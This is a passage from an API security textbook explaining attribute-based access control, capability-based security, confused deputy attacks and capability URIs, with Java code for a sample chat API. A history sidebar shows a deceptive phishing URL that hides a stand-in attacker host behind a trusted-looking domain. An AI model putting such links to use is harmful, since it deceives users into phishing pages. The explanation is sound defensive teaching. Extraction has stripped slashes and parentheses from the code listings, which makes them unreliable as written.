 see chapter 7 .   A Policy Administration Point  PAP  provides an interface for administrators to  define and manage policies.  The four components may be collocated or can be distributed on different machines. In  particular,  the  XACML  architecture  allows  policy  definitions  to  be  centralized within an organization, allowing easy administration and review. Multiple PEPs for dif- ferent APIs can talk to the PDP via an API  typically a REST API , and XACML sup- ports  the  concept  of  policy  sets  to  allow  policies  for  different  PEPs  to  be  grouped together with different combining rules. Many vendors offer implementations of the XACML  reference  architecture  in  some  form,  although  often  without  the  standard XML policy language, providing policy agents or gateways and PDP services that you   Attribute-based access control  291  The Policy Information Point gathers attributes from information sources and caches them.

It’s easy to develop overly complex rules, making it hard to determine  exactly  who  has  access  to  what.  I  have  heard  of  deployments  with  many thousands of policy rules. Small changes to rules can have dramatic impacts, and it can be hard to predict how rules will combine. As an example, I once worked on a sys- tem that implemented ABAC rules in the form of XPath expressions that were applied to incoming XML messages; if a message matched any rule, it was rejected.    It turned out that a small change to the document structure made by another team caused many of the  rules to no longer match, which  allowed invalid requests to be processed for several weeks before somebody noticed. It would’ve been nice to be able   292  CHAPTER 8 Identity-based access control  to automatically tell when these XPath expressions could no longer match any mes- sages, but due to the flexibility of XPath, this turns out to be impossible to determine automatically in general, and all our tests continued using the old format. This anec- dote shows the potential downside of flexible policy evaluation engines, but they are still a very powerful way to structure access control logic.   To maximize the benefits of ABAC while limiting the potential for mistakes, con-  sider adopting the following best practices:   Layer ABAC over a simpler access control technology such as RBAC. This pro- vides  a defense-in-depth  strategy so  that  a mistake  in  the  ABAC rules  doesn’t result in a total loss of security.   Implement  automated  testing  of  your  API  endpoints  so  that  you  are  alerted quickly if a policy change results in access being granted to unintended parties.  Ensure access control policies are maintained in a version control system so that they can be easily rolled back if necessary. Ensure proper review of all policy changes.   Consider which aspects of policy should be centralized and which should be left up to individual APIs or local policy agents. Though it can be tempting to cen- tralize  everything,  this  can  introduce  a  layer  of  bureaucracy  that  can  make  it harder to make changes. In the worst case, this can violate the principle of least privilege because overly broad policies are left in place due to the overhead of changing them.   Measure the performance overhead of ABAC policy evaluation early and often.

Capability-based security and macaroons  This chapter covers  Sharing individual resources via capability URLs  Avoiding confused deputy attacks against identity-  based access control   Integrating capabilities with a RESTful API design  Hardening capabilities with macaroons and   contextual caveats  In  chapter  8,  you  implemented  identity-based  access  controls  that  represent  the mainstream approach to access control in modern API design. Sometimes identity- based  access  controls  can  come  into  conflict  with  other  principles  of  secure  API design. For example, if a Natter user wishes to share a message that they wrote with a wider audience, they would like to just copy a link to it. But this won’t work unless the users they are sharing the link with are also members of the Natter social space it was posted to, because they won’t be granted access. The only way to grant those users access to that message is to either make them members of the space, which violates  the  principle  of  least  authority   because  they  now  have  access  to  all  the messages in that space , or else to copy and paste the whole message into a differ- ent system.   294   Capability-based security  295    People  naturally  share  resources  and  delegate  access  to  others  to  achieve  their goals, so an API security solution should make this simple and secure; otherwise, your users will find insecure ways to do it anyway. In this chapter, you’ll implement capability- based access control techniques that enable secure sharing by taking the principle of least authority  POLA  to its logical conclusion and allowing fine-grained control over access to individual resources. Along the way, you’ll see how capabilities prevent a gen- eral category of attacks against APIs known as confused deputy attacks.  DEFINITION A confused deputy attack occurs when a component of a system with elevated privileges can be tricked by an attacker into carrying out actions that the attacker themselves would not be allowed to perform. The CSRF attacks of chapter 4 are classic examples of confused deputy attacks, where the web browser is tricked into carrying out the attacker’s requests using the victim’s session cookie.  9.1  Capability-based security A capability is an unforgeable reference to an object or resource together with a set of permissions to access that resource. To illustrate how capability-based security dif- fers from identity-based security, consider the following two ways to copy a file on UNIX1 systems:   cp a.txt b.txt  cat  b.txt  The first, using the cp command, takes as input the name of the file to copy and the name of the file to copy it to. The second, using the cat command, instead takes as input two file descriptors: one opened for reading and the other opened for writing. It then simply reads the data from the first file descriptor and writes it to the second.  DEFINITION A file descriptor is an abstract handle that represents an open file along  with  a  set  of  permissions  on  that  file.  File  descriptors  are  a  type  of capability.  If you think about the permissions that each of these commands needs, the cp com- mand needs to be able to open any file that you can name for both reading and writ- ing. To allow this, UNIX runs the cp command with the same permissions as your own user account, so it can do anything you can do, including deleting all your files and emailing your private photos to a stranger. This violates POLA because the command is given far more permissions than it needs. The cat command, on the other hand, just needs to read from its input and write to its output. It doesn’t need any permis- sions at all  but of course UNIX gives it all your permissions anyway . A file descriptor is an example of a capability, because it combines a reference to some resource along with a set of permissions to act on that resource.   1 This example is taken from “Paradigm Regained: Abstraction Mechanisms for Access Control.” See http:    mng.bz Mog7.   296  CHAPTER 9 Capability-based security and macaroons   Compared with the more dominant identity-based access control techniques dis-  cussed in chapter 8, capabilities have several differences:   Access to resources is via unforgeable references to those objects that also grant authority  to  access  that  resource.  In  an  identity-based  system,  anybody  can attempt  to  access  a  resource,  but  they  might  be  denied  access  depending  on who they are. In a capability-based system, it is impossible to send a request to a resource if you do not have a capability to access it. For example, it is impossible to write to a file descriptor that your process doesn’t have. You’ll see in section 9.2 how this is implemented for REST APIs.   Capabilities provide fine-grained access to individual resources, and often sup- port POLA more naturally than identity-based systems. It is much easier to dele- gate  a  small  part  of  your  authority  to  somebody  else  by  giving  them  some capabilities without giving them access to your whole account.   The ability to easily share capabilities can make it harder to determine who has access to which resources via your API. In practice this is often true for identity-based  systems  too,  as  people  share  access  in  other  ways   such  as  by sharing passwords .   Some  capability-based  systems  do  not  support  revoking  capabilities  after  they have  been  granted.  When  revocation  is  supported,  revoking  a  widely  shared capability may deny access to more people than was intended.  One of the reasons why capability-based security is less widely used than identity-based security is due to the widespread belief that capabilities are hard to control due to easy sharing and the apparent difficulty of revocation. In fact, these problems are solved by real-world  capability  systems  as  discussed  in  the  paper  Capability  Myths  Demolished by Mark  S.  Miller,  Ka-Ping  Yee,  and  Jonathan  Shapiro   http:  srl.cs.jhu.edu pubs  SRL2003-02.pdf . To take  one  example, it  is  often assumed that capabilities can be used only for discretionary access control, because the creator of an object  such as a file  can share capabilities to access that file with anyone. But in a pure capability system, communications between people are also controlled by capabilities  as is the ability to create files in the first place , so if Alice creates a new file, she can share a capability to access this file with Bob only if she has a capability allowing her to communicate with Bob. Of course, there’s nothing to stop Bob asking Alice in person to perform actions on the file, but that is a problem that no access control system can prevent.  A brief history of capabilities Capability-based  security  was  first  developed  in  the  context  of  operating  systems such as KeyKOS in the 1970s and has been applied to programming languages and network protocols since then. The IBM System 38, which was the predecessor of the successful AS 400  now IBM i , used capabilities for managing access to objects. In the 1990s, the E programming language  http:  erights.org  combined capability-based security with object-oriented  OO  programming to create object-capability-based security    9.2  Capabilities and REST  297   or ocaps , where capabilities are just normal object references in a memory-safe OO programming  language.  Object-capability-based  security  fits  well  with  conventional wisdom  regarding  good  OO  design  and  design  patterns,  because  both  emphasize eliminating global variables and avoiding static methods that perform side effects.   E also included a secure protocol for making method calls across a network using capabilities. This protocol has been adopted and updated by the Cap’n Proto  https:   capnproto.org rpc.htmlsecurity   framework,  which  provides  a  very  efficient  binary protocol  for  implementing  APIs based  on  remote  procedure  calls.  Capabilities  are also now making an appearance on popular websites and REST APIs.  Capabilities and REST The  examples  so  far  have  been  based  on  operating  system  security,  but  capability- based security can also be applied to REST APIs available over HTTP. For example, suppose you’ve developed a Natter iOS app that allows the user to select a profile pic- ture,  and  you  want  to  allow  users  to  upload  a  photo  from  their  Dropbox  account. Dropbox  supports  OAuth2  for  third-party  apps,  but  the  access  allowed  by  OAuth2 scopes is relatively broad; typically, a user can grant access only to all their files or else create an app-specific folder separate from the rest of their files. This can work well when the application needs regular access to lots of your files, but in this case your app needs only temporary access to download a single file chosen by the user. It vio- lates POLA to grant permanent read-only access to your entire Dropbox just to upload one photo. Although OAuth scopes are great for restricting permissions granted to third-party apps, they tend to be static and applicable to all users. Even if you had a scope for each individual file, the app would have to already know which file it needed access to at the point of making the authorization request.2   To support this use case, Dropbox developed the Chooser and Saver APIs  see https:   www.dropbox.com developers chooser  and  https:  www.dropbox.com developers  saver , which allow an app developer to ask the user for one-off access to specific files in their Dropbox. Rather than starting an OAuth flow, the app developer instead calls an SDK function that will display a Dropbox-provided file selection UI as shown in fig- ure  9.1.  Because  this  UI  is  implemented  as  a  separate  browser  window  running  on dropbox.com and not as part of the third-party app, it can show all the user’s files. When  the  user  selects  a  file,  Dropbox  returns  a  capability  to  the  application  that allows it to access just the file that the user selected for a short period of time  4 hours currently for the Chooser API .       2 There are proposals to make OAuth work better for these kinds of transactional one-off operations, such as https:   oauth.xyz, but these largely still require the app to know what resource it wants to access before it begins the flow.   298  CHAPTER 9 Capability-based security and macaroons  Figure 9.1 The Dropbox Chooser UI allows a user to select individual files to share  with an application. The app is given time-limited read-only access to just the files  the user selects.  The Chooser and Saver APIs provide a number of advantages over a normal OAuth2 flow for this simple file sharing use case:   The app author doesn’t have to decide ahead of time what resource it needs to access. Instead, they just tell Dropbox that they need a file to open or to save data to and Dropbox lets the user decide which file to use. The app never gets to see a list of the user’s other files at all.   Because the app is not requesting long-term access to the user’s account, there is  no need for a consent page to ensure the  user knows what access they are granted. Selecting a file in the UI implicitly indicates consent and because the scope is so fine-grained, the risks of abuse are much lower.   The UI is implemented by Dropbox and so is consistent for every app and web page that uses the API. Little details like the “Recent” menu item work consis- tently across all apps.  For these use cases, capabilities provide a very intuitive and natural user experience that  is  also  significantly  more  secure  than  the  alternatives.  It’s  often  assumed  that there is a natural trade-off between security and usability: the more secure a system is, the  harder  it  must  be  to  use.  Capabilities  seem  to  defy  this  conventional  wisdom, because moving to a more fine-grained management of permissions allows more con- venient patterns of interaction. The user chooses the files they want to work with, and   Capabilities and REST  299  the system grants the app access to just those files, without needing a complicated con- sent process.  Confused deputies and ambient authority Many common vulnerabilities in APIs and other software are variations on what is known as a confused deputy attack, such as the CSRF attacks discussed in chapter 4, but many kinds of injection attack and XSS are also caused by the same issue. The problem occurs when a process is authorized to act with your authority  as your “deputy” , but an attacker can trick that process to carry out malicious actions. The original confused deputy  http:  cap-lore.com CapTheory ConfusedDeputy.html  was a compiler running on a shared computer. Users could submit jobs to the compiler and provide the name of an output file to store the result to. The compiler would also keep a record of each job for billing purposes. Somebody realized that they could pro- vide the name of the billing file as the output file and the compiler would happily over- write it, losing all records of who had done what. The compiler had permissions to write to any file and this could be abused to overwrite a file that the user themselves could not access.  In CSRF, the deputy is your browser that has been given a session cookie after you logged in. When you make requests to the API from JavaScript, the browser automat- ically adds the cookie to authenticate the requests. The problem is that if a malicious website makes requests to your API, then the browser will also attach the cookie to those requests, unless you take additional steps to prevent that  such as the anti- CSRF measures in chapter 4 . Session cookies are an example of ambient authority: the cookie forms part of the environment in which a web page runs and is transpar- ently  added  to  requests.  Capability-based  security  aims  to  remove  all  sources  of ambient  authority  and  instead  require  that  each  request  is  specifically  authorized according to POLA.  DEFINITION When  the  permission  to  perform  an  action  is  automatically granted to all requests that originate from a given environment this is known as  ambient  authority.  Examples  of  ambient  authority  include  session  cookies and allowing access based on the IP address a request comes from. Ambient authority  increases  the  risks  of  confused  deputy  attacks  and  should  be avoided whenever possible.  9.2.1  Capabilities as URIs  File descriptors rely on special regions of memory that can be altered only by privi- leged code in the operating system kernel to ensure that processes can’t tamper or create fake file descriptors. Capability-secure programming languages are also able to prevent tampering by controlling the runtime in which code runs. For a REST API, this  isn’t  an  option  because  you  can’t  control  the  execution  of  remote  clients,  so another technique needs to be used to ensure that capabilities cannot be forged or tam- pered with. You have already seen several techniques for creating unforgeable tokens in chapters  4,  5,  and  6,  using  unguessable  large  random  strings  or  using  cryptographic   300  CHAPTER 9 Capability-based security and macaroons  techniques to authenticate the tokens. You can reuse these token formats to create capability tokens, but there are several important differences:   Token-based authentication conveys the identity of a user, from which their per- missions can be looked up. A capability instead directly conveys some permis- sions and does not identify a user at all.   Authentication tokens are designed to be used to access many resources under one API, so are not tied to any one resource. Capabilities are instead directly coupled to a resource and can be used to access only that resource. You use dif- ferent capabilities to access different resources.   A token will typically be short-lived because it conveys wide-ranging access to a user’s account. A capability, on the other hand, can live longer because it has a much narrower scope for abuse.  REST already has a standard format for identifying resources, the URI, so this is the natural representation of a capability for a REST API. A capability represented as a URI is known as a capability URI. Capability URIs are widespread on the web, in the form of links sent in password reset emails, GitHub Gists, and document sharing as in the Dropbox example.  DEFINITION A capability URI  or capability URL  is a URI that both identifies a  resource  and  conveys  a  set  of  permissions  to  access  that  resource.  Typi- cally, a capability URI encodes an unguessable token into some part of the URI structure.  To  create  a  capability  URI,  you  can  combine  a  normal  URI  with  a  security  token. There are several ways that you can do this, as shown in figure 9.2.  The token can be encoded into the resource path . . .  https:  api.example.com resource abCd9..  https:  api.example.com resource?tok=abCd9..  https:  api.example.com resourcetok=abCd9..  . . . or into the query parameters or fragment.  https:  abCd9..@api.example.com resource  You can also encode the token into the userinfo component.  Figure 9.2 There are many ways to encode a security token into a URI. You can  encode it into the resource path, or you can provide it using a query parameter. More  sophisticated representations encode the token into the fragment or userinfo  elements of the URI, but these require some client-side parsing.   Capabilities and REST  301  A commonly used approach is to encode a random token into the path component of the URI, which is what the Dropbox Chooser API does, returning URIs like the following:  https:  dl.dropboxusercontent.com 1 view 8ygmwuqzf1l6x7c   ➥ book graphics CH08_FIG8.2_RBAC.png  In  the  Dropbox  case,  the  random  token  is  encoded  into  a  prefix  of  the  actual  file path. Although this is a natural representation, it means that the same resource may be represented by URIs with completely different paths depending on the token, so a client that receives access to the same resource through different capability URIs may not be able to tell that they actually refer to the same resource. An alternative is to pass the token as a query parameter, in which case the Dropbox URI would look like the following:  https:  dl.dropboxusercontent.com 1 view   ➥ book graphics CH08_FIG8.2_RBAC.png?token=8ygmwuqzf1l6x7c  There is a standard form for such URIs when the token is an OAuth2 token defined by  RFC  6750   https:  tools.ietf.org html rfc6750section-2.3   using  the  parameter name  access_token.  This  is  often  the  simplest  approach  to  implement  because  it requires no changes to existing resources, but it shares some security weaknesses with the path-based approach:   Both URI paths and query parameters are frequently logged by web servers and proxies, which can make the capability available to anybody who has access to the logs. Using TLS will prevent proxies from seeing the URI, but a request may still pass through several servers unencrypted in a typical deployment.   The full URI may be visible to third parties through the HTTP Referer header or  the  window.referrer  variable  exposed  to  content  running  in  an  HTML iframe.  You  can  use  the  Referrer-Policy  header  and  rel=”noreferrer” attribute on links in your UI to prevent this leakage. See http:  mng.bz 1g0g for details.   URIs used in web browsers may be accessible to other users by looking at your  browser history.  To harden capability URIs against these threats, you can encode the token into the fragment component or the URI or even the userinfo part that was originally designed for storing HTTP Basic credentials in a URI. Neither the fragment nor the userinfo component of a URI are sent to a web server by default, and they are both stripped from URIs communicated in Referer headers.        302  CHAPTER 9 Capability-based security and macaroons  Credentials in URIs: A lesson from history The desire to share access to private resources simply by sharing a URI is not new. For a long time, browsers supported encoding a username and password into a HTTP URL in the form http:   alice:secret@example.com resource. When such a link was clicked,  the  browser  would  send  the  username  and  password  using  HTTP  Basic authentication  see chapter 3 . Though convenient, this is widely considered to be a security disaster. For a start, sharing a username and password provides full access to your account to anybody who sees the URI. Secondly, attackers soon realized that this could be used to create convincing phishing links such as http:   www.google .com:80@evil.example.com login.html. An unsuspecting user would see the google .com domain at the start of the link and assume it was genuine, when in fact this is just a username and they will really be sent to a fake login page on the attacker’s site. To prevent these attacks, browser vendors have stopped supporting this URI syntax and most now aggressively remove login information when displaying or follow- ing such links. Although capability URIs are significantly more secure than directly sharing a password, you should still be aware of any potential for misuse if you dis- play URIs to users.  CAPABILITY URIS FOR REST APIS The drawbacks of capability URIs just mentioned apply when they are used as a means of navigating a website. When capability URIs are used in a REST API many of these issues don’t apply:   The Referer header and window.referrer variables are populated by brows- ers when a user directly navigates from one web page to another, or when one page is embedded into another in an iframe. Neither of these apply to the typ- ical  JSON  responses  from  an  API  because  these  are  not  directly  rendered as pages.   Similarly, because users don’t typically navigate directly to API endpoints, these  URIs will not end up in the browser history.   API  URIs  are  also  unlikely  to  be  bookmarked  or  otherwise  saved  for  a  long period of time. Typically, a client knows a few permanent URIs as entry points to an API and then navigates to other URIs as it accesses resources. These resource URIs can use short-lived tokens to mitigate against tokens being leaked in access logs. This idea is explored further in section 9.2.3.  In the remainder of the chapter, you’ll use capability URIs with the token encoded into the query parameter because this is simple to implement. To mitigate any threat from tokens leaking in log files, you’ll use short-lived tokens and apply further protec- tions in section 9.2.4.        Capabilities and REST  303  Pop quiz 1 Which of the following are good places to encode a token into a capability URI?  a The fragment b The hostname c The scheme name  d The port number e The path component The query parameters f g The userinfo component  2 Which  of  the  following  are  differences  between  capabilities  and  token-based  authentication? a Capabilities are bulkier than authentication tokens. b Capabilities can’t be revoked, but authentication tokens can. c Capabilities  are  tied  to  a  single  resource,  while  authentication  tokens  are  d Authentication tokens are tied to an individual user identity, while capability  applicable to all resources in an API.  tokens can be shared between users  e Authentication tokens are short-lived, while capabilities often have a longer  lifetime.  The answers are at the end of the chapter.  9.2.2 Using capability URIs in the Natter API  To add capability URIs to Natter, you first need to implement the code to create a capability URI. To do this, you can reuse an existing TokenStore implementation to create the token component, encoding the resource path and permissions into  the token attributes as shown in listing 9.1. Because capabilities are not tied to an individ- ual user account, you should leave the username field of the token blank. The token can then be encoded into the URI as a query parameter, using the standard  access _token  field  from  RFC  6750.  You  can  use  the  java.net.URI  class  to  construct  the capability URI, passing in the path and query parameters. Some of the capability URIs you’ll create will be long-lived, but others will be short-lived to mitigate against tokens being stolen. To support this, allow the caller to specify how long the capability should live for by adding an expiry Duration argument that is used to set the expiry time of the token.    Open  the  Natter  API  project3  and  navigate  to  src main java com manning  apisecurityinaction controller and create a new file named CapabilityController.java with the content of listing 9.1 and save the file.  3 You  can  get  the  project  from  https:  github.com NeilMadden apisecurityinaction  if  you  haven’t  worked  through chapter 8. Check out branch chapter09.   304  CHAPTER 9 Capability-based security and macaroons  Listing 9.1 Generating capability URIs  package com.manning.apisecurityinaction.controller;  import com.manning.apisecurityinaction.token.SecureTokenStore; import com.manning.apisecurityinaction.token.TokenStore.Token; import spark.*; import java.net.*; import java.time.*; import java.util.*; import static java.time.Instant.now;  public class CapabilityController {  Leave the username null when creating the token.      private final SecureTokenStore tokenStore;                        public CapabilityController SecureTokenStore tokenStore  {           this.tokenStore = tokenStore;                                }  Use an existing  SecureTokenStore  to generate tokens.      public URI createUri Request request, String path, String perms,             Duration expiryDuration  {          var token = new Token now  .plus expiryDuration , null ;             token.attributes.put "path", path ;                              token.attributes.put "perms", perms ;                             var tokenId = tokenStore.create request, token ;  Encode the  resource path  and permissions  into the token.          var uri = URI.create request.uri   ;         return uri.resolve path + "?access_token=" + tokenId ;         } }  Add the token to the URI as a query parameter.  You  can  now  wire  up  code  to  create  the  CapabilityController  inside  your  main method,  so  open  Main.java  in  your  editor  and  create  a  new  instance  of  the  object along with a token store for it to use. You can use any secure token store implementa- tion, but for this chapter you’ll use the DatabaseTokenStore because it creates short tokens and therefore short URIs.   If  you  worked  through  chapter  6  and  chose  to  mark  the  Database- NOTE TokenStore as a ConfidentialTokenStore only, then you’ll need to wrap it in a HmacTokenStore in the following snippet. Refer to chapter 6  section 6.4  if you get stuck.  You  should  also  pass  the  new  controller  as  an  additional  argument  to  the  Space- Controller constructor, because you will shortly use it to create capability URIs:  var database = Database.forDataSource datasource ; var capController = new CapabilityController          new DatabaseTokenStore database  ; var spaceController = new SpaceController database, capController ; var userController = new UserController database ;   Capabilities and REST  305  Before you can start generating capability URIs, though, you need to make one tweak to the database token store. The current store requires that every token has an associ- ated  user  and  will  raise  an  error  if  you  try  to  save  a  token  with  a  null  username. Because capabilities are not identity-based, you need to remove this restriction. Open schema.sql in your editor and remove the not-null constraint from the tokens table by deleting the words NOT NULL from the end of the user_id column definition. The new table definition should look like the following:  CREATE TABLE tokens      token_id VARCHAR 30  PRIMARY KEY,     user_id VARCHAR 30  REFERENCES users user_id ,        expiry TIMESTAMP NOT NULL,     attributes VARCHAR 4096  NOT NULL  ;  Remove the NOT NULL  constraint here.  RETURNING CAPABILITY URIS You can now adjust the API to return capability URIs that can be used to access social spaces and messages. Where the API currently returns a simple path to a social space or message such as  spaces 1, you’ll instead return a full capability URI that can be used  to  access  it.  To  do  this,  you  need  to  add  the CapabilityController  as  a  new argument to the SpaceController constructor, as shown in listing 9.2. Open Space- Controller.java in your editor and add the new field and constructor argument.  Listing 9.2 Adding the CapabilityController  public class SpaceController {   private static final Set  DEFINED_ROLES =           Set.of "owner", "moderator", "member", "observer" ;  Add the Capability- Controller as a new field and con- structor argument.    private final Database database;   private final CapabilityController capabilityController;                 public SpaceController Database database,                          CapabilityController capabilityController  {       this.database = database;     this.capabilityController = capabilityController;                     }  The next step is to adjust the createSpace method to use the CapabilityController to create a capability URI to return, as shown in listing 9.3. The code changes are very minimal: simply call the createUri method to create the capability URI. As the user that creates a space is given full permissions over it, you can pass in all permissions when creating the URI. Once a space has been created, the only way to access it will be through the capability URI, so ensure that this link doesn’t expiry by passing a large expiry time. Then use the  uri.toASCIIString   method to convert the URI into a properly encoded string. Because you’re going to use capabilities for access you can remove the lines that insert into the user_roles table; these are no longer needed.   306  CHAPTER 9 Capability-based security and macaroons  Open SpaceController.java in your editor and adjust the implementation of the create- Space method to match listing 9.3. New code is highlighted in bold.  Listing 9.3 Returning a capability URI    public JSONObject createSpace Request request, Response response  {     var json = new JSONObject request.body   ;     var spaceName = json.getString "name" ;     if  spaceName.length   > 255  {       throw new IllegalArgumentException "space name too long" ;     }     var owner = json.getString "owner" ;     if  !owner.matches "[a-zA-Z][a-zA-Z0-9]{1,29}"   {       throw new IllegalArgumentException "invalid username" ;     }     var subject = request.attribute "subject" ;     if  !owner.equals subject   {       throw new IllegalArgumentException                "owner must match authenticated user" ;     }      return database.withTransaction tx -> {       var spaceId = database.findUniqueLong            "SELECT NEXT VALUE FOR space_id_seq;" ;        database.updateUnique            "INSERT INTO spaces space_id, name, owner  " +               "VALUES ?, ?, ? ;", spaceId, spaceName, owner ;        var expiry = Duration.ofDays 100000 ;           var uri = capabilityController.createUri request,                    " spaces " + spaceId, "rwd", expiry ;                 response.status 201 ;       response.header "Location", uri.toASCIIString   ;           return new JSONObject                 .put "name", spaceName                .put "uri", uri ;                } ;   }  Ensure the link doesn’t expire.  Create a capability URI with full permissions.  Return the URI as a  string in the Location  header and JSON  response.  VALIDATING CAPABILITIES Although you are returning a capability URL, the Natter API is still using RBAC to grant  access  to  operations.  To  convert  the  API  to  use  capabilities  instead,  you  can replace the current UserController.lookupPermissions method, which determines permissions by looking up the authenticated user’s roles, with an alternative that reads the permissions directly from the capability token. Listing 9.4 shows the implementa- tion of a lookupPermissions filter for the CapabilityController.    The filter first checks for a capability token in the access_token query parameter. If no token is present, then it returns without setting any permissions. This will result   Capabilities and REST  307  in  no  access  being  granted.  After  that,  you  need  to  check  that  the  resource  being accessed exactly matches the resource that the capability is for. In this case, you can check that the path being accessed matches the path stored in the token attributes, by looking at the request.pathInfo   method. If all these conditions are satisfied, then you  can  set  the  permissions  on  the  request  based  on  the  permissions  stored  in  the capability  token.  This  is  the  same  perms  request  attribute  that  you  set  in  chapter  8 when implementing RBAC, so the existing permission checks on individual API calls will work as before, picking up the permissions from the capability URI rather than from a role lookup. Open CapabilityController.java in your editor and add the new method from listing 9.4.  Listing 9.4 Validating a capability token  public void lookupPermissions Request request, Response response  {     var tokenId = request.queryParams "access_token" ;         if  tokenId == null  { return; }      tokenStore.read request, tokenId .ifPresent token -> {             var tokenPath = token.attributes.get "path" ;                  if  Objects.equals tokenPath, request.pathInfo     {               request.attribute "perms",                                     token.attributes.get "perms"  ;            }     } ; }  Copy the permissions from the token to the request.  Look up the token from  the query parameters.  Check that the token  is valid and matches  the resource path.  To complete the switch-over to capabilities you then need to change the filters used to lookup the current user’s permissions to instead use the new capability filter. Open Main.java in your editor and locate the three before   filters that currently call user- Controller::lookupPermissions and change them to call the capability controller filter. I’ve highlighted the change of controller in bold:  before " spaces :spaceId messages",          capController::lookupPermissions ; before " spaces :spaceId messages *",          capController::lookupPermissions ; before " spaces :spaceId members",         capController::lookupPermissions ;  You can now restart the API server, create a user, and then create a new social space. This works exactly like before, but now you get back a capability URI in the response to creating the space:  $ curl -X POST -H 'Content-Type: application json' \     -d '{"name":"test","owner":"demo"}' \     -u demo:password https:  localhost:4567 spaces {"name":"test", ➥ "uri":"https:  localhost:4567 spaces 1?access_token= ➥ jKbRWGFDuaY5yKFyiiF3Lhfbz-U"}   308  CHAPTER 9 Capability-based security and macaroons  TIP You may be wondering why you had to create a user and authenticate before you could create a space in the last example. After all, didn’t we just move away from identity-based security? The answer is that the identity is not being used to authorize the action in this case, because no permissions are required  to  create  a  new  social  space.  Instead,  authentication  is  required purely for accountability, so that there is a record in the audit log of who cre- ated the space.  9.2.3 HATEOAS  You now have a capability URI returned from creating a social space, but you can’t do much with it. The problem is that this URI allows access to only the resource repre- senting the space itself, but to read or post messages to the space the client needs to access  the  sub-resource   spaces 1 messages  instead.  Previously,  this  wouldn’t  be  a problem because the client could just construct the path to get to the messages and use the same token to also access that resource. But a capability token gives access to only a single specific resource, following POLA. To access the messages, you’ll need a different  capability,  but  capabilities  are  unforgeable  so  you  can’t just create  one!  It seems like this capability-based security model is a real pain to use.   If you are a RESTful design aficionado, you may know that having the client just know that it needs to add  messages to the end of a URI to access the messages is a violation  of  a  central  REST  principle,  which  is  that  client  interactions  should  be driven by hypertext  links . Rather than a client needing to have specific knowledge about  how  to  access resources  in  your API,  the server  should  instead  tell  the  client where resources are and how to access them. This principle is given the snappy title Hypertext  as  the  Engine  of  Application  State,  or  HATEOAS  for  short.  Roy  Fielding,  the originator  of  the  REST  design  principles,  has  stated  that  this  is  a  crucial  aspect  of REST API design  http:  mng.bz Jx6v .  PRINCIPLE HATEOAS, or hypertext as the engine of application state, is a central principle of REST API design that states that a client should not need to have specific knowledge of how to construct URIs to access your API. Instead, the server  should  provide  this  information  in  the  form  of  hyperlinks  and  form templates.  The aim of HATEOAS is to reduce coupling between the client and server that would otherwise prevent the server from evolving its API over time because it might break assumptions made by clients. But HATEOAS is also a perfect fit for capability URIs because we can return new capability URIs as links in response to using another capa- bility  URI,  allowing  a  client  to  securely  navigate  from  resource  to  resource  without needing to manufacture any URIs by themselves.4  4  In this chapter, you’ll return links as URIs within normal JSON fields. There are standard ways of representing links in JSON, such as JSON-LD  https:  json-ld.org , but I won’t cover those in this book.   Capabilities and REST  309    You  can  allow  a  client  to  access  and  post  new  messages  to  the  social  space  by returning  a  second  URI  from  the  createSpace  operation  that  allows  access  to  the messages resource for this space, as shown in listing 9.5. You simply create a second capability URI for that path and return it as another link in the JSON response. Open SpaceController.java  in  your  editor  again  and  update  the  end  of  the  createSpace method to create the second link. The new lines of code are highlighted in bold.  Listing 9.5 Adding a messages link    var uri = capabilityController.createUri request,           " spaces " + spaceId, "rwd", expiry ;   var messagesUri = capabilityController.createUri request,               " spaces " + spaceId + " messages", "rwd", expiry ;      response.status 201 ;   response.header "Location", uri.toASCIIString   ;  Create a new  capability URI for  the messages.    return new JSONObject             .put "name", spaceName            .put "uri", uri            .put "messages", messagesUri ;      Return the messages  URI as a new field in  the response.  If you restart the API server again and create a new space, you’ll see both URIs are now returned. A GET request to the messages URI will return a list of messages in the space, and this can now be accessed by anybody with that capability URI. For example, you can open that link directly in a web browser. You can also POST a new message to the same URI. Again, this operation requires authentication in addition to the capa- bility URI because the message explicitly claims to be from a particular user and so the API should authenticate that claim. Permission to post the message comes from the capability, while proof of identity comes from authentication:  $ curl -X POST -H 'Content-Type: application json' \     -u demo:password \                                  -d '{"author":"demo","message":"Hello!"}' \   'https:  localhost:4567 spaces 1 messages?access_token= ➥ u9wu69dl5L8AT9FNe03TM-s4H8M'          Proof of identity is supplied  by authenticating.  Permission to post is granted  by the capability URI alone.  SUPPORTING DIFFERENT LEVELS OF ACCESS The capability URIs returned so far provide full access to the resources that they iden- tify,  as  indicated  by  the  rwd  permissions   read-write-delete,  if  you  remember  from chapter 3 . This means that it’s impossible to give somebody else access to the space without giving them full access to delete other user’s messages. So much for POLA!    One solution to this is to return multiple capability URIs with different levels of access, as shown in listing 9.6. The space owner can then give out the more restricted URIs  while  keeping  the  URI  that  grants  full  privileges  for  trusted  moderators  only. Open SpaceController.java again and add the additional capabilities from the listing. Restart the API and try performing different actions with different capabilities.   310  CHAPTER 9 Capability-based security and macaroons  Listing 9.6 Restricted capabilities        var uri = capabilityController.createUri request,               " spaces " + spaceId, "rwd", expiry ;       var messagesUri = capabilityController.createUri request,               " spaces " + spaceId + " messages", "rwd", expiry ;       var messagesReadWriteUri = capabilityController.createUri                   request, " spaces " + spaceId + " messages", "rw",                  expiry ;                                                    var messagesReadOnlyUri = capabilityController.createUri                    request, " spaces " + spaceId + " messages", "r",                   expiry ;                                               Create additional capability URIs with restricted permissions.        response.status 201 ;       response.header "Location", uri.toASCIIString   ;        return new JSONObject                 .put "name", spaceName                .put "uri", uri                .put "messages-rwd", messagesUri                          .put "messages-rw", messagesReadWriteUri                  .put "messages-r", messagesReadOnlyUri ;     Return the  additional  capabilities.  To complete the  conversion  of  the API to  capability-based security,  you need to go through the other API actions and convert each to return appropriate capability URIs. This is largely a straightforward task, so we won’t cover it here. One aspect to be aware of is that you should ensure that the capabilities you return do not grant more permis- sions than the capability that was used to access a resource. For example, if the capa- bility used to list messages in a space granted only read permissions, then the links to individual messages within a space should also be read-only. You can enforce this by always basing the permissions for a new link on the permissions set for the current request, as shown in listing 9.7 for the findMessages method. Rather than providing read and delete permissions for all messages, you instead use the permissions from the existing request. This ensures that users in possession of a moderator capability will  see  links  that  allow  both  reading  and  deleting  messages,  while  ordinary  access through a read-write or read-only capability will only see read-only message links.  Listing 9.7 Enforcing consistent permissions  Look up the permissions  from the current request.      var perms = request. attribute "perms"                 .replace "w", "" ;                            response.status 200 ;     return new JSONArray messages.stream           .map msgId -> " spaces " + spaceId + " messages " + msgId          